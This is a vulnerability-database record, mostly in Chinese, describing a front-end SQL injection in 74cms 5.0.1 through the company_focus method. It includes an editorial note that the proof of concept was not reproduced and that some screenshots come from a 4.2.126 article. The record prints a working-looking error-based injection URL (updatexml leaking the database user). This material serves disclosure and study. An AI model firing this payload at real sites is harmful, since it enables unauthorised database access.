---
source: "hatch 补库批 20260928"
product: "74cms"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "74cms v5.0.1前台sql注入"
prerequisites: "来源所述条件，未列明部分仍待核：5.0.1; ordinary logged-in user; company_focus"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-b4ca74b5167385b9268ea23c"
entity_id: "ve-b4ca74b5167385b9268ea23c"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.0.1; ordinary logged-in user; company_focus

- **事实待核（1）**：Impact section empty but version in title and auth explicitly stated。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（2）**：Cross-version screenshots reference 4.2.126 SQL article; need verify their relevance。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（3）**：Same company_focus match-operator sink as 4.2.126 first vector; not enough evidence for identical article merge。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（4）**：No original source URL。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 74cms v5.0.1 前台sql注入

一、漏洞简介
------------

74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入

二、漏洞影响
------------

三、复现过程
------------

### 具体信息

文件位置：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php

方法：function company\_focus(\$company\_id)

是否需登录：需要

登录权限：普通用户即可

### Payload:

    http://0-sec.org/74cms/5.0.1/upload/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a

![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId26.png)

### 源码分析：

文件：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php

company\_focus
方法是参数化函数，\$company\_id参数是不经过I函数过滤的，所以只要where可以控制，那就可以注入

![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId28.png)

跟踪add\_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞

![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId29.png)
